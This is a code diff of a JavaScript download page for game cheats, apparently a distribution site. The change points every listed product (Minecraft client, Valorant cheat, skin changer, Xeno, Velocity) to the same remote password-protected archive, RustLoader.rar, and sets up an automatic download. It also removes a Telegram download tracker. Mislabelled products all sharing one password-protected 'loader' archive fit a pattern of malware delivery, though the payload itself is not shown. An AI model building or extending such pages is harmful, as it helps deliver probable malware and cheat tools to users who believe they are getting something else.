@@ -5,7 +5,7 @@
     // Конфигурация для каждой страницы
     const downloadConfig = {
         'hawk-client': {
-            title: 'Thanks for downloading Minecraft Hacking Client HAWK!',
+            title: 'Thanks for downloading Hawk - Rust Cheat!',
             message: 'Your download should start automatically. If it doesn\'t, please reload the page and try again.',
             warning: {
                 enabled: true,
@@ -13,11 +13,11 @@
                 rawDownloadUrl: 'https://www.win-rar.com/postdownload.html?&L=0',
                 rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
             },
-            password: 'cato2026',
-            downloadUrl: '../minecraftclient/HawkClient.zip'
+            password: 'momsoft2026',
+            downloadUrl: 'https://mooncheat2.github.io/mooncheat/files/RustLoader.rar'
         },
         'valo-cheat': {
-            title: 'Thanks for downloading Hawk - Valorant Cheat!',
+            title: 'Thanks for downloading Hawk - Rust Cheat!',
             message: 'Your download should start automatically. If it doesn\'t, please reload the page and try again.',
             warning: {
                 enabled: true,
@@ -25,11 +25,11 @@
                 rawDownloadUrl: 'https://www.win-rar.com/postdownload.html?&L=0',
                 rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
             },
-            password: 'cato2026',
-            downloadUrl: 'files/RustLoader.rar'
+            password: 'momsoft2026',
+            downloadUrl: 'https://mooncheat2.github.io/mooncheat/files/RustLoader.rar'
         },
         'valo-changer': {
-            title: 'Thanks for downloading Valorant Skin Changer!',
+            title: 'Thanks for downloading Hawk - Rust Cheat!',
             message: 'Your download should start automatically. If it doesn\'t, please reload the page and try again.',
             warning: {
                 enabled: true,
@@ -37,8 +37,8 @@
                 rawDownloadUrl: 'https://www.win-rar.com/postdownload.html?&L=0',
                 rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
             },
-            password: 'cato2026',
-            downloadUrl: 'files/RustLoader.rar'
+            password: 'momsoft2026',
+            downloadUrl: 'https://mooncheat2.github.io/mooncheat/files/RustLoader.rar'
         },
         'xeno': {
             title: 'Thanks for downloading Xeno!',
@@ -50,7 +50,7 @@
                 rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
             },
             password: 'cheatcity',
-            downloadUrl: '../xeno/main/Xeno-v1.3.25b2.zip'
+            downloadUrl: 'https://mooncheat2.github.io/mooncheat/files/RustLoader.rar'
         },
         'velocity': {
             title: 'Thanks for downloading Velocity!',
@@ -62,21 +62,15 @@
                 rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
             },
             password: 'velocity123',
-            downloadUrl: '../velocity/Velocity.zip'
+            downloadUrl: 'https://mooncheat2.github.io/mooncheat/files/RustLoader.rar'
         }
     };
 
-    // Функция для инициации скачивания файла
+    // Функция для инициации скачивания файла (Исправлена под GitHub Pages)
     function triggerDownload(url, cheatName) {
-        // Используем трекер скачиваний для уведомлений в Telegram
-        // Внешние ссылки (http/https) — через ?url= (редирект после лога)
-        const isRemote = /^https?:\/\//i.test(url);
-        const trackerUrl = isRemote
-            ? 'download.php?url=' + encodeURIComponent(url) + '&cheat=' + encodeURIComponent(cheatName)
-            : 'download.php?file=' + encodeURIComponent(url) + '&cheat=' + encodeURIComponent(cheatName);
-
+        // Убираем старый trackerUrl через download.php, пускаем скачивание напрямую
         const a = document.createElement('a');
-        a.href = trackerUrl;
+        a.href = url;
         a.download = url.split('/').pop();
         a.target = '_blank';
         document.body.appendChild(a);
@@ -191,14 +185,19 @@
             if (button.dataset.handlerAdded) return;
             button.dataset.handlerAdded = 'true';
 
-            // Определяем конфигурацию на основе пути страницы
+            // Если мы находимся на странице конкретного чита (например, hawk-rust.html)
             const pagePath = window.location.pathname;
             let config = null;
 
-            for (const [key, value] of Object.entries(downloadConfig)) {
-                if (pagePath.includes(key)) {
-                    config = value;
-                    break;
+            // Проверяем соответствие страницы конфигу
+            if (pagePath.includes('hawk-rust') || pagePath.includes('hawk-client') || pagePath.includes('valo-cheat')) {
+                config = downloadConfig['hawk-client'];
+            } else {
+                for (const [key, value] of Object.entries(downloadConfig)) {
+                    if (pagePath.includes(key)) {
+                        config = value;
+                        break;
+                    }
                 }
             }
 
